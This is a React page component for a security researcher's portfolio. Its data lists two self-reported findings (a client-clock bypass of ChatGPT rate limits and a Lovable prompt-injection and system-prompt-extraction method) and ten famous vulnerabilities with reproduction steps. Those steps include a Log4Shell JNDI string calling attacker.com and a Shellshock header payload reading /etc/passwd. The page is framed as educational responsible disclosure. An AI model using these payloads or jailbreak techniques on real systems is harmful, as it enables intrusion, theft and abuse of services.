import { motion } from 'framer-motion';
import { ArrowLeft, AlertTriangle, Clock, Shield, Bug, ExternalLink, ChevronRight, ThumbsUp, Heart, Share2 } from 'lucide-react';
import { Link } from 'react-router-dom';
import { useState, useEffect } from 'react';
import { supabase } from '@/integrations/supabase/client';
import { useToast } from '@/hooks/use-toast';
import zerodayOpenaiImg from '@/assets/zeroday-openai.jpg';
import zerodayLog4jImg from '@/assets/zeroday-log4j.jpg';
import zerodayHeartbleedImg from '@/assets/zeroday-heartbleed.jpg';
import zerodayShellshockImg from '@/assets/zeroday-shellshock.jpg';
import zerodayProxylogonImg from '@/assets/zeroday-proxylogon.jpg';
import zerodaySpectreImg from '@/assets/zeroday-spectre.jpg';
import zerodayLovableImg from '@/assets/zeroday-lovable.jpg';
import zerodayEternalblueImg from '@/assets/zeroday-eternalblue.jpg';
import zerodaySolarwindsImg from '@/assets/zeroday-solarwinds.jpg';
import zerodayMeltdownImg from '@/assets/zeroday-meltdown.jpg';
import zerodayPegasusImg from '@/assets/zeroday-pegasus.jpg';
import zerodayMoveitImg from '@/assets/zeroday-moveit.jpg';

/* ================================
   LIKE BUTTON (report-level)
================================ */
const ReportLikeButton = ({ reportId }: { reportId: number }) => {
  const [count, setCount] = useState(0);
  const [liked, setLiked] = useState(false);
  const [animating, setAnimating] = useState(false);

  useEffect(() => {
    const key = 'liked_reports';
    const likedReports = JSON.parse(localStorage.getItem(key) || '[]');
    setLiked(likedReports.includes(reportId));

    supabase
      .from('project_likes')
      .select('id', { count: 'exact', head: true })
      .eq('project_id', reportId + 100)
      .then(({ count: c }) => setCount(c ?? 0));
  }, [reportId]);

  const handleLike = async () => {
    if (liked) return;
    setAnimating(true);
    setTimeout(() => setAnimating(false), 600);

    const { error } = await supabase
      .from('project_likes')
      .insert({ project_id: reportId + 100 });

    if (!error) {
      setCount((c) => c + 1);
      setLiked(true);
      const key = 'liked_reports';
      const likedReports = JSON.parse(localStorage.getItem(key) || '[]');
      localStorage.setItem(key, JSON.stringify([...likedReports, reportId]));
    }
  };

  return (
    <button
      onClick={handleLike}
      className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg border text-sm font-mono transition-all ${
        liked
          ? 'bg-primary/20 border-primary/50 text-primary'
          : 'border-primary/20 text-muted-foreground hover:text-primary hover:border-primary/40'
      }`}
    >
      <ThumbsUp
        className={`w-4 h-4 transition-transform ${animating ? 'scale-125' : ''} ${liked ? 'fill-primary' : ''}`}
      />
      {count}
    </button>
  );
};

/* ================================
   SHARE BUTTON
================================ */
const ReportShareButton = ({ title }: { title: string }) => {
  const { toast } = useToast();
  const handleShare = async () => {
    const shareUrl = 'https://kevinw3bcodes.web.app/zero-day';
    if (navigator.share) {
      try { await navigator.share({ title, url: shareUrl }); } catch {}
    } else {
      await navigator.clipboard.writeText(shareUrl);
      toast({ title: 'Link copied!', description: 'Zero-day report link copied to clipboard.' });
    }
  };
  return (
    <button
      onClick={handleShare}
      className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-primary/20 text-muted-foreground text-sm font-mono hover:text-primary hover:border-primary/40 transition-all"
    >
      <Share2 className="w-4 h-4" />
      Share
    </button>
  );
};

/* ================================
   REPORT DATA TYPES
================================ */
interface Report {
  id: number;
  title: string;
  target: string;
  severity: string;
  status: string;
  date: string;
  image: string;
  tags: string[];
  summary: string;
  impact: string[];
  steps: string[];
  techDetails: string;
  credit?: string;
  cve?: string;
}

/* ================================
   MY REPORTS
================================ */
const myReports: Report[] = [
  {
    id: 1,
    title: 'Client-Side System Time Manipulation Bypasses Image Generation Rate Limits & Messaging in ChatGPT',
    target: 'OpenAI — ChatGPT',
    severity: 'High',
    status: 'Reported',
    date: '2025',
    image: zerodayOpenaiImg,
    tags: ['Zero-Day', 'Rate Limit Bypass', 'Client-Side', 'ChatGPT'],
    summary:
      'Discovered that manipulating the local system clock on the client device allows an attacker to completely bypass image generation rate limits and messaging quotas enforced by ChatGPT. The vulnerability exists because the rate-limiting logic relies on client-side timestamps rather than server-side validation.',
    impact: [
      'Unlimited DALL·E image generations without paying for Plus/Pro',
      'Bypass of messaging rate limits on GPT-4 and GPT-4o',
      'Financial loss to OpenAI through resource abuse',
      'Potential for automated abuse at scale',
    ],
    steps: [
      'Open ChatGPT and exhaust the image generation or messaging quota',
      'Open system settings and advance the clock forward (e.g. +24 hours)',
      'Return to ChatGPT — the rate limit resets immediately',
      'Generate unlimited images or send unlimited messages',
      'Repeat by advancing the clock further each time',
    ],
    techDetails:
      'The rate-limiting mechanism stores the usage window timestamp on the client side (likely via localStorage or a cookie tied to local time). When the system clock is changed, the client-side check calculates that the rate window has expired, allowing the user to bypass the quota without any server-side re-validation. This is a classic TOCTOU (Time-of-Check to Time-of-Use) flaw where the "check" happens on an untrusted client.',
  },
  {
    id: 2,
    title: 'Prompt Injection & Context Leakage in Lovable AI Code Generation Platform',
    target: 'Lovable — AI Code Editor',
    severity: 'Medium',
    status: 'Reported',
    date: '2025',
    image: zerodayLovableImg,
    tags: ['Zero-Day', 'Prompt Injection', 'AI Security', 'Lovable'],
    summary:
      'Discovered that carefully crafted prompts could manipulate the AI code generation engine to leak internal system prompts, bypass content restrictions, and generate potentially malicious code patterns. The vulnerability stems from insufficient input sanitization in the prompt processing pipeline.',
    impact: [
      'Exposure of internal system prompts and configuration details',
      'Bypass of safety guardrails for code generation',
      'Potential generation of code with embedded vulnerabilities',
      'Information disclosure about the AI model architecture',
    ],
    steps: [
      'Craft a specially formatted prompt with nested instruction overrides',
      'Use role-playing techniques to bypass content filtering',
      'Extract system prompt fragments through iterative probing',
      'Leverage leaked context to craft more targeted injection payloads',
      'Document the full attack chain for responsible disclosure',
    ],
    techDetails:
      'The AI code generation platform processes user prompts alongside system-level instructions. By crafting inputs that mimic system-level formatting, an attacker can confuse the model\'s instruction hierarchy, causing it to treat attacker-controlled text as privileged instructions. This is a form of indirect prompt injection where the boundary between user input and system context is insufficiently enforced.',
  },
];

/* ================================
   NOTABLE REPORTS (by others)
================================ */
const notableReports: Report[] = [
  {
    id: 101,
    title: 'Log4Shell — Remote Code Execution via JNDI Lookup in Apache Log4j',
    target: 'Apache — Log4j 2',
    severity: 'Critical',
    status: 'Patched',
    date: '2021',
    image: zerodayLog4jImg,
    tags: ['CVE-2021-44228', 'RCE', 'Java', 'Log4j'],
    summary:
      'A critical remote code execution vulnerability in Apache Log4j 2 that allows attackers to execute arbitrary code on any system using Log4j for logging. By sending a specially crafted string containing a JNDI lookup, an attacker can force the server to load and execute a malicious Java class from a remote server.',
    impact: [
      'Full remote code execution on affected servers',
      'Affected millions of Java applications worldwide including cloud services',
      'Trivially exploitable with a single crafted log message',
      'Used in widespread attacks within hours of public disclosure',
    ],
    steps: [
      'Identify a target application using Apache Log4j 2 (versions 2.0–2.14.1)',
      'Craft a malicious JNDI lookup string: ${jndi:ldap://attacker.com/exploit}',
      'Inject the string into any logged field (User-Agent, form input, etc.)',
      'Log4j processes the lookup and connects to the attacker\'s LDAP server',
      'The server responds with a malicious Java class that gets executed',
    ],
    techDetails:
      'Log4j\'s message lookup substitution feature allows JNDI (Java Naming and Directory Interface) lookups within log messages. When a string like ${jndi:ldap://...} appears in a log message, Log4j resolves it by making a network request. This allows loading remote Java classes via LDAP, RMI, or DNS, leading to arbitrary code execution in the context of the application.',
    credit: 'Chen Zhaojun (Alibaba Cloud Security Team)',
    cve: 'CVE-2021-44228',
  },
  {
    id: 102,
    title: 'Heartbleed — OpenSSL TLS Heartbeat Extension Memory Disclosure',
    target: 'OpenSSL',
    severity: 'Critical',
    status: 'Patched',
    date: '2014',
    image: zerodayHeartbleedImg,
    tags: ['CVE-2014-0160', 'Memory Leak', 'TLS', 'OpenSSL'],
    summary:
      'A catastrophic vulnerability in OpenSSL\'s implementation of the TLS Heartbeat extension that allows attackers to read up to 64KB of server memory per request. This can expose private keys, session tokens, passwords, and other sensitive data without leaving any trace in server logs.',
    impact: [
      'Extraction of server private SSL/TLS keys',
      'Theft of user session cookies and credentials',
      'Affected ~17% of all SSL servers on the internet',
      'No authentication required and completely undetectable',
    ],
    steps: [
      'Connect to a vulnerable OpenSSL server (versions 1.0.1 through 1.0.1f)',
      'Send a malformed TLS Heartbeat request with a large payload length',
      'The server responds with memory contents beyond the intended buffer',
      'Repeat thousands of times to harvest private keys and session data',
      'Decrypt past and future TLS traffic using the stolen private key',
    ],
    techDetails:
      'The TLS Heartbeat extension allows peers to send a payload and receive it echoed back. The vulnerable code failed to validate that the actual payload length matched the declared length in the Heartbeat request. An attacker could claim a 64KB payload while sending only a 1-byte payload, causing the server to read and return 64KB of adjacent memory — a classic buffer over-read vulnerability.',
    credit: 'Neel Mehta (Google Security)',
    cve: 'CVE-2014-0160',
  },
  {
    id: 103,
    title: 'Shellshock — Arbitrary Code Execution via Bash Environment Variables',
    target: 'GNU Bash',
    severity: 'Critical',
    status: 'Patched',
    date: '2014',
    image: zerodayShellshockImg,
    tags: ['CVE-2014-6271', 'RCE', 'Bash', 'CGI'],
    summary:
      'A family of vulnerabilities in GNU Bash that allow attackers to execute arbitrary commands through specially crafted environment variables. Particularly devastating when exploited through CGI scripts on web servers, allowing remote code execution with a single HTTP request.',
    impact: [
      'Remote code execution on web servers using CGI scripts',
      'Affected virtually every Linux/Unix system running Bash',
      'Exploitable through HTTP headers, DHCP clients, and SSH',
      'Worm-capable — automated exploitation spread rapidly',
    ],
    steps: [
      'Identify a target running CGI scripts processed by Bash',
      'Craft an HTTP request with a malicious User-Agent or other header',
      'Include the payload: () { :; }; /bin/cat /etc/passwd',
      'The server processes the header as a Bash environment variable',
      'Bash executes the trailing command after the function definition',
    ],
    techDetails:
      'Bash\'s environment variable import mechanism allowed function definitions to be stored in environment variables. However, Bash continued parsing and executing commands after the function definition\'s closing brace. An attacker could append arbitrary commands after a function definition in any environment variable, and Bash would execute them during variable import — before the actual script even ran.',
    credit: 'Stephane Chazelas',
    cve: 'CVE-2014-6271',
  },
  {
    id: 104,
    title: 'ProxyLogon — Pre-Auth RCE Chain in Microsoft Exchange Server',
    target: 'Microsoft Exchange Server',
    severity: 'Critical',
    status: 'Patched',
    date: '2021',
    image: zerodayProxylogonImg,
    tags: ['CVE-2021-26855', 'RCE', 'SSRF', 'Exchange'],
    summary:
      'A chain of four zero-day vulnerabilities in Microsoft Exchange Server that were actively exploited by the HAFNIUM threat group. The attack chain begins with an SSRF vulnerability that allows an unauthenticated attacker to send arbitrary HTTP requests and authenticate as the Exchange server, ultimately achieving remote code execution.',
    impact: [
      'Full compromise of on-premise Exchange servers without credentials',
      'Access to all email communications in the organization',
      'Over 250,000 servers compromised globally before patching',
      'Used by multiple APT groups for espionage and ransomware deployment',
    ],
    steps: [
      'Exploit SSRF (CVE-2021-26855) to bypass authentication',
      'Use the forged authentication to access Exchange backend',
      'Write a web shell to disk using arbitrary file write (CVE-2021-27065)',
      'Execute commands through the web shell with SYSTEM privileges',
      'Maintain persistent access and exfiltrate email data',
    ],
    techDetails:
      'The SSRF vulnerability in the Exchange Unified Messaging service allowed sending arbitrary HTTP requests as the Exchange server machine account. Combined with an insecure deserialization bug and an arbitrary file write vulnerability, attackers could chain these flaws to drop a web shell (typically an ASPX file) in a web-accessible directory, gaining persistent remote code execution with SYSTEM-level privileges.',
    credit: 'DEVCORE (Orange Tsai), Volexity',
    cve: 'CVE-2021-26855',
  },
  {
    id: 105,
    title: 'Spectre — Speculative Execution Side-Channel Attack on Modern CPUs',
    target: 'Intel, AMD, ARM — Modern Processors',
    severity: 'High',
    status: 'Mitigated',
    date: '2018',
    image: zerodaySpectreImg,
    tags: ['CVE-2017-5753', 'Hardware', 'Side-Channel', 'CPU'],
    summary:
      'A fundamental hardware vulnerability affecting virtually all modern processors. Spectre exploits speculative execution — a CPU performance optimization — to trick programs into leaking sensitive information from their memory space. Unlike software bugs, Spectre is rooted in CPU architecture design and cannot be fully patched without hardware changes.',
    impact: [
      'Read arbitrary memory from any process on the same CPU',
      'Affects Intel, AMD, and ARM processors manufactured since ~1995',
      'Can be exploited via JavaScript in a web browser',
      'Fundamentally undermines process isolation guarantees',
    ],
    steps: [
      'Identify a conditional branch in the target process',
      'Train the branch predictor by repeatedly executing the branch with valid inputs',
      'Provide an out-of-bounds index that the CPU speculatively uses',
      'The speculative execution loads secret data into the CPU cache',
      'Use a cache timing side-channel (Flush+Reload) to extract the secret byte',
    ],
    techDetails:
      'Modern CPUs use speculative execution to predict and pre-execute instructions beyond conditional branches. While mispredicted speculations are architecturally rolled back, they leave observable side effects in the CPU cache. Spectre Variant 1 (bounds check bypass) exploits this by training the branch predictor to speculatively execute an out-of-bounds memory access, encoding the secret data into cache timing differences that can be measured by the attacker.',
    credit: 'Jann Horn (Google Project Zero), Paul Kocher et al.',
    cve: 'CVE-2017-5753',
  },
  {
    id: 106,
    title: 'EternalBlue — SMBv1 Remote Code Execution Exploited by WannaCry',
    target: 'Microsoft Windows — SMBv1',
    severity: 'Critical',
    status: 'Patched',
    date: '2017',
    image: zerodayEternalblueImg,
    tags: ['CVE-2017-0144', 'RCE', 'SMB', 'WannaCry', 'NSA'],
    summary:
      'A devastating vulnerability in Microsoft\'s SMBv1 protocol originally developed as a cyberweapon by the NSA. After being leaked by the Shadow Brokers group, it was weaponized in the WannaCry ransomware attack that infected over 230,000 computers across 150 countries in a single day.',
    impact: [
      'WannaCry ransomware infected 230,000+ systems in 150 countries',
      'Estimated $4–8 billion in damages globally',
      'Crippled the UK National Health Service, causing cancelled surgeries',
      'Self-propagating worm capability — no user interaction required',
    ],
    steps: [
      'Scan for systems with SMBv1 port 445 open',
      'Send specially crafted SMB packets that trigger a buffer overflow',
      'The overflow allows writing shellcode into kernel memory',
      'Execute arbitrary code with SYSTEM privileges remotely',
      'Propagate to other vulnerable systems on the network automatically',
    ],
    techDetails:
      'EternalBlue exploits a buffer overflow in Microsoft\'s SMBv1 protocol handling. Specifically, it targets the way SMBv1 handles transaction structures, allowing an attacker to send malformed packets that cause a pool buffer overflow in the Windows kernel. This allows writing attacker-controlled data to kernel memory, achieving remote code execution at the highest privilege level without any authentication.',
    credit: 'NSA (developed) / Shadow Brokers (leaked)',
    cve: 'CVE-2017-0144',
  },
  {
    id: 107,
    title: 'SolarWinds SUNBURST — Supply Chain Backdoor in Orion Platform',
    target: 'SolarWinds — Orion Platform',
    severity: 'Critical',
    status: 'Patched',
    date: '2020',
    image: zerodaySolarwindsImg,
    tags: ['Supply Chain', 'Backdoor', 'APT29', 'Espionage'],
    summary:
      'One of the most sophisticated supply chain attacks in history. Russian state-sponsored actors (APT29/Cozy Bear) compromised SolarWinds\' build system to inject a backdoor (SUNBURST) into the Orion software update. The trojanized update was distributed to approximately 18,000 organizations including US government agencies.',
    impact: [
      'Compromised 18,000+ organizations including US Treasury and DHS',
      'Backdoor remained undetected for 9+ months',
      'Full access to victim networks including email and file systems',
      'Considered the most significant cyber-espionage operation of the decade',
    ],
    steps: [
      'Attackers compromised SolarWinds build infrastructure',
      'Injected SUNBURST backdoor into Orion software updates',
      'Trojanized updates were signed with legitimate SolarWinds certificates',
      'SUNBURST activated after 2-week dormancy, contacted C2 via DNS',
      'Attackers moved laterally using stolen credentials and forged SAML tokens',
    ],
    techDetails:
      'The SUNBURST backdoor was injected into the SolarWinds.Orion.Core.BusinessLayer.dll during the build process. It used steganography in HTTP responses, domain generation algorithms for C2 communication disguised as legitimate Orion API traffic, and a 12-14 day dormancy period to evade sandbox analysis. The malware checked for security tools and avoided execution in monitored environments.',
    credit: 'FireEye (Kevin Mandia\'s team)',
    cve: 'N/A (Supply Chain)',
  },
  {
    id: 108,
    title: 'Meltdown — Rogue Data Cache Load on Intel Processors',
    target: 'Intel — x86 Processors',
    severity: 'Critical',
    status: 'Mitigated',
    date: '2018',
    image: zerodayMeltdownImg,
    tags: ['CVE-2017-5754', 'Hardware', 'Side-Channel', 'CPU', 'Intel'],
    summary:
      'A hardware vulnerability that breaks the fundamental isolation between user applications and the operating system kernel. Meltdown allows any unprivileged process to read all physical memory mapped in the kernel address space, including passwords, encryption keys, and other secrets — at speeds up to 500KB/s.',
    impact: [
      'Read all physical memory from an unprivileged userspace process',
      'Bypass kernel address space layout randomization (KASLR)',
      'Affects nearly every Intel processor since 1995',
      'Cloud environments at risk — VMs could read host memory',
    ],
    steps: [
      'Execute a transient instruction that loads kernel memory into a register',
      'Before the CPU raises the privilege violation exception, use the data',
      'Encode the secret data into the cache via a dependent memory access',
      'After the exception, use Flush+Reload to determine which cache line was loaded',
      'Reconstruct the secret byte from the cache side-channel',
    ],
    techDetails:
      'Meltdown exploits out-of-order execution in Intel CPUs. When a user-space program accesses kernel memory, the CPU eventually raises an exception. However, before the exception is handled, the CPU has already speculatively executed subsequent instructions using the illegally accessed data. These transient instructions modify the cache state based on the kernel data, creating an observable side channel that survives the architectural rollback of the speculative execution.',
    credit: 'Jann Horn (Google Project Zero), TU Graz (Daniel Gruss et al.)',
    cve: 'CVE-2017-5754',
  },
  {
    id: 109,
    title: 'Pegasus — Zero-Click iOS Exploit Chain by NSO Group',
    target: 'Apple iOS — iMessage',
    severity: 'Critical',
    status: 'Patched',
    date: '2021',
    image: zerodayPegasusImg,
    tags: ['Zero-Click', 'Spyware', 'iOS', 'NSO Group', 'FORCEDENTRY'],
    summary:
      'A zero-click exploit chain used by NSO Group\'s Pegasus spyware to fully compromise iPhones without any user interaction. The attack leveraged a vulnerability in Apple\'s CoreGraphics PDF parsing (FORCEDENTRY) delivered via iMessage, bypassing Apple\'s BlastDoor sandbox — one of the most sophisticated mobile exploits ever documented.',
    impact: [
      'Full iPhone compromise with zero user interaction required',
      'Access to messages, calls, camera, microphone, and location',
      'Used to surveil journalists, activists, and political figures globally',
      'Bypassed Apple\'s BlastDoor sandbox specifically designed to prevent such attacks',
    ],
    steps: [
      'Attacker sends a malicious PDF disguised as a GIF via iMessage',
      'iMessage automatically processes the attachment without user action',
      'The PDF exploits a vulnerability in CoreGraphics JBIG2 decoder',
      'JBIG2 logic gates are chained to build a virtual CPU architecture',
      'The virtual CPU executes shellcode to escape sandbox and install Pegasus',
    ],
    techDetails:
      'The FORCEDENTRY exploit used a JBIG2 image codec vulnerability to achieve arbitrary code execution. Remarkably, it constructed a small computer architecture using JBIG2\'s logical operations (AND, OR, XOR) to create logic gates, registers, and a full adder — essentially building a virtual CPU within the image decompressor. This virtual machine then executed the exploit payload, making it one of the most technically sophisticated exploits ever analyzed.',
    credit: 'Citizen Lab (University of Toronto), Google Project Zero (Ian Beer & Samuel Groß)',
    cve: 'CVE-2021-30860',
  },
  {
    id: 110,
    title: 'MOVEit Transfer — SQL Injection Leading to Mass Data Breach',
    target: 'Progress Software — MOVEit Transfer',
    severity: 'Critical',
    status: 'Patched',
    date: '2023',
    image: zerodayMoveitImg,
    tags: ['CVE-2023-34362', 'SQLi', 'Data Breach', 'Cl0p', 'Ransomware'],
    summary:
      'A critical SQL injection vulnerability in MOVEit Transfer\'s web application that was mass-exploited by the Cl0p ransomware gang. The flaw allowed unauthenticated attackers to access the database, steal data, and deploy web shells. Over 2,500 organizations and 67 million individuals were affected in one of the largest data breaches of 2023.',
    impact: [
      'Over 2,500 organizations breached including government agencies and banks',
      '67+ million individuals had personal data stolen',
      'Cl0p ransomware gang used it for mass extortion campaign',
      'Estimated damages exceeding $10 billion across all victims',
    ],
    steps: [
      'Send a crafted HTTP request to the MOVEit Transfer web application',
      'Exploit SQL injection in the authentication bypass endpoint',
      'Gain access to the underlying Azure SQL or MySQL database',
      'Extract sensitive data and deploy a LEMURLOOT web shell',
      'Maintain persistent access for ongoing data exfiltration',
    ],
    techDetails:
      'The vulnerability existed in MOVEit Transfer\'s web application where user-supplied input was not properly sanitized before being used in SQL queries. The SQL injection allowed attackers to bypass authentication, enumerate database contents, and execute arbitrary SQL statements. The Cl0p group automated exploitation at scale, deploying web shells that provided persistent backdoor access for data theft operations.',
    credit: 'Progress Software (disclosed after active exploitation by Cl0p)',
    cve: 'CVE-2023-34362',
  },
];

const severityColor: Record<string, string> = {
  Critical: 'text-red-500 border-red-500/40 bg-red-500/10',
  High: 'text-orange-400 border-orange-400/40 bg-orange-400/10',
  Medium: 'text-yellow-400 border-yellow-400/40 bg-yellow-400/10',
  Low: 'text-secondary border-secondary/40 bg-secondary/10',
};

/* ================================
   REPORT CARD COMPONENT
================================ */
const ReportCard = ({ report, index }: { report: Report; index: number }) => (
  <motion.article
    key={report.id}
    initial={{ opacity: 0, y: 30 }}
    animate={{ opacity: 1, y: 0 }}
    transition={{ duration: 0.6, delay: index * 0.1 }}
    className="card-cyber overflow-hidden"
  >
    {/* Hero image */}
    <div className="relative h-48 sm:h-64 md:h-80 overflow-hidden">
      <img src={report.image} alt={report.title} className="w-full h-full object-cover" />
      <div className="absolute inset-0 bg-gradient-to-t from-background via-background/70 to-transparent" />
      <div className="absolute top-4 right-4">
        <span className={`px-3 py-1 text-xs font-mono font-bold uppercase rounded border ${severityColor[report.severity]}`}>
          {report.severity} Severity
        </span>
      </div>
      <div className="absolute bottom-4 left-4 sm:left-6">
        <div className="flex items-center gap-2 text-xs font-mono text-muted-foreground mb-1">
          <Clock className="w-3 h-3" />
          {report.date}
          <span className="mx-1 text-primary">|</span>
          <span className="text-primary">{report.status}</span>
        </div>
        <p className="font-mono text-sm sm:text-base text-primary">Target: {report.target}</p>
      </div>
    </div>

    <div className="p-4 sm:p-6 md:p-8">
      <h2 className="text-lg sm:text-xl md:text-2xl font-bold font-mono mb-4 leading-tight">{report.title}</h2>

      {report.cve && (
        <div className="mb-3">
          <span className="px-2 py-1 text-xs font-mono bg-destructive/10 text-destructive border border-destructive/30 rounded">
            {report.cve}
          </span>
        </div>
      )}

      <div className="flex flex-wrap gap-2 mb-6">
        {report.tags.map((tag) => (
          <span key={tag} className="px-2 py-1 text-xs font-mono bg-primary/10 text-primary border border-primary/30 rounded">
            {tag}
          </span>
        ))}
      </div>

      <div className="mb-6">
        <h3 className="font-mono text-sm text-primary mb-2 flex items-center gap-2">
          <ChevronRight className="w-4 h-4" /> Summary
        </h3>
        <p className="text-muted-foreground text-sm sm:text-base leading-relaxed">{report.summary}</p>
      </div>

      <div className="mb-6">
        <h3 className="font-mono text-sm text-primary mb-2 flex items-center gap-2">
          <AlertTriangle className="w-4 h-4" /> Impact
        </h3>
        <ul className="space-y-2">
          {report.impact.map((item, i) => (
            <li key={i} className="flex items-start gap-2 text-muted-foreground text-sm sm:text-base">
              <span className="text-destructive mt-1 shrink-0">▸</span>
              {item}
            </li>
          ))}
        </ul>
      </div>

      <div className="mb-6">
        <h3 className="font-mono text-sm text-primary mb-2 flex items-center gap-2">
          <Bug className="w-4 h-4" /> Steps to Reproduce
        </h3>
        <div className="bg-black/60 border border-primary/20 rounded-lg p-3 sm:p-4 font-mono text-xs sm:text-sm space-y-2">
          {report.steps.map((step, i) => (
            <div key={i} className="flex gap-3">
              <span className="text-primary shrink-0">[{String(i + 1).padStart(2, '0')}]</span>
              <span className="text-muted-foreground">{step}</span>
            </div>
          ))}
        </div>
      </div>

      <div className="mb-6">
        <h3 className="font-mono text-sm text-primary mb-2 flex items-center gap-2">
          <Shield className="w-4 h-4" /> Technical Analysis
        </h3>
        <div className="bg-card/80 border border-primary/10 rounded-lg p-3 sm:p-4">
          <p className="text-muted-foreground text-sm sm:text-base leading-relaxed">{report.techDetails}</p>
        </div>
      </div>

      {/* Credit */}
      {report.credit && (
        <div className="mb-6 text-xs font-mono text-muted-foreground">
          <span className="text-primary">// credited to:</span> {report.credit}
        </div>
      )}

      {/* Like, Share, Support */}
      <div className="flex flex-wrap items-center gap-3 mb-6">
        <ReportLikeButton reportId={report.id} />
        <ReportShareButton title={report.title} />
        <a
          href="https://coff.ee/kevinw3b"
          target="_blank"
          rel="noopener noreferrer"
          className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-primary/20 text-muted-foreground text-sm font-mono hover:text-primary hover:border-primary/40 transition-all"
        >
          <Heart className="w-4 h-4" />
          Support
        </a>
      </div>

      {/* Footer */}
      <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 pt-4 border-t border-primary/10">
        <div className="flex items-center gap-2 text-xs font-mono text-muted-foreground">
          <span className="w-2 h-2 rounded-full bg-orange-400 animate-pulse" />
          Responsibly Disclosed
        </div>
        <span className="font-mono text-xs text-muted-foreground">
          {report.credit ? `// ${report.credit}` : '// discovered by @kevinw3b'}
        </span>
      </div>
    </div>
  </motion.article>
);

/* ================================
   MAIN PAGE
================================ */
const allReports = [...myReports, ...notableReports];

const ZeroDay = () => {
  return (
    <div className="min-h-screen bg-background text-foreground">
      <div className="scanline" />

      {/* HEADER */}
      <header className="fixed top-0 left-0 right-0 z-40 bg-background/90 backdrop-blur-md border-b border-primary/20">
        <div className="container mx-auto px-4 sm:px-6 py-4 flex justify-between items-center">
          <Link to="/" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
            <ArrowLeft className="w-5 h-5" />
            <span className="font-mono text-sm sm:text-base">Back to Home</span>
          </Link>
          <span className="font-mono text-primary text-sm sm:text-base">&lt;zero_day/&gt;</span>
        </div>
      </header>

      {/* MAIN */}
      <main className="pt-24 pb-16">
        <div className="container mx-auto px-4 sm:px-6">

          {/* PAGE TITLE */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6 }}
            className="text-center mb-12 sm:mb-16"
          >
            <span className="code-tag">&lt;zero_day_reports&gt;</span>
            <h1 className="section-title text-gradient mt-4 text-2xl sm:text-3xl md:text-4xl">
              Zero-Day Discoveries
            </h1>
            <p className="text-muted-foreground mt-4 max-w-2xl mx-auto text-sm sm:text-base">
              Real vulnerability reports from my security research alongside notable
              zero-day findings that shaped the cybersecurity landscape.
            </p>

            {/* Stats bar */}
            <div className="flex flex-wrap justify-center gap-4 sm:gap-8 mt-8">
              {[
                { icon: Bug, label: 'Total Reports', value: String(allReports.length) },
                { icon: AlertTriangle, label: 'My Discoveries', value: String(myReports.length) },
                { icon: Shield, label: 'Responsibly Disclosed', value: '100%' },
              ].map((stat) => (
                <div
                  key={stat.label}
                  className="flex items-center gap-2 px-3 sm:px-4 py-2 rounded-lg border border-primary/20 bg-card/50"
                >
                  <stat.icon className="w-4 h-4 text-primary" />
                  <span className="font-mono text-xs sm:text-sm">
                    <span className="text-primary font-bold">{stat.value}</span>{' '}
                    <span className="text-muted-foreground">{stat.label}</span>
                  </span>
                </div>
              ))}
            </div>
          </motion.div>

          {/* MY REPORTS */}
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.4 }}
            className="mb-8"
          >
            <h2 className="font-mono text-lg sm:text-xl text-primary mb-6 flex items-center gap-2">
              <Bug className="w-5 h-5" />
              // my_discoveries
            </h2>
          </motion.div>

          <div className="space-y-8 sm:space-y-12 mb-16">
            {myReports.map((report, index) => (
              <ReportCard key={report.id} report={report} index={index} />
            ))}
          </div>

          {/* NOTABLE REPORTS */}
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.4, delay: 0.2 }}
            className="mb-8"
          >
            <h2 className="font-mono text-lg sm:text-xl text-primary mb-2 flex items-center gap-2">
              <Shield className="w-5 h-5" />
              // notable_zero_days
            </h2>
            <p className="text-muted-foreground text-sm font-mono ml-7">
              Historic vulnerabilities discovered by security researchers worldwide
            </p>
          </motion.div>

          <div className="space-y-8 sm:space-y-12">
            {notableReports.map((report, index) => (
              <ReportCard key={report.id} report={report} index={index} />
            ))}
          </div>

          {/* CTA */}
          <motion.div
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6, delay: 0.3 }}
            className="card-cyber p-6 sm:p-8 text-center mt-12 sm:mt-16"
          >
            <div className="font-mono text-sm text-primary mb-4">
              // more_reports_incoming()
            </div>
            <h2 className="text-xl sm:text-2xl font-bold mb-4">More Reports Coming Soon</h2>
            <p className="text-muted-foreground max-w-2xl mx-auto mb-6 text-sm sm:text-base">
              I'm actively hunting for vulnerabilities across major platforms.
              Stay tuned for more zero-day disclosures and security research.
            </p>
            <Link to="/#contact" className="btn-cyber-filled inline-flex items-center gap-2">
              <ExternalLink className="w-4 h-4" />
              Get in Touch
            </Link>
          </motion.div>

          <div className="text-center mt-12 sm:mt-16">
            <span className="code-tag">&lt;/zero_day_reports&gt;</span>
          </div>
        </div>
      </main>
    </div>
  );
};

export default ZeroDay;
